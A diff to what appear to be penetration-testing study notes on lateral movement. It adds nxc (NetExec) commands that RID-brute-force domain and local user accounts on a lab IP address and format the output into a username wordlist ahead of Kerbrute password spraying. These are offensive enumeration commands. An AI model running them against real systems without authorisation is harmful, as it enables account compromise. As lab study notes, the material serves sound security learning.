@@ -4,6 +4,7 @@ Once credentials or many credentials are found we'll have to utilize them to spr
 - Create wordlist of all domain users.
 - Create wordlist of all retrieved passwords/hashes.
 
+##### nxc spraying domain users
 
 ```
 nxc smb 192.168.230.244 -u 'ka' -p 'ka' --rid-brute
@@ -15,6 +16,19 @@ Saved the nxc output into an users.txt file and ran the following command:
 grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
 ```
 
+##### nxc spraying local users
+
+Save the output in an "users.txt" file.
+
+```
+nxc smb 192.168.230.244 -u 'ka' -p 'ka' --rid-brute --local-auth
+```
+
+Formatted the output properly and stored it in an newusers.txt wordlist.
+
+```
+awk -F'\\' '{print $2}' users.txt > newusers.txt
+```
 ##### Kerbrute passwordspraying
 
 ```
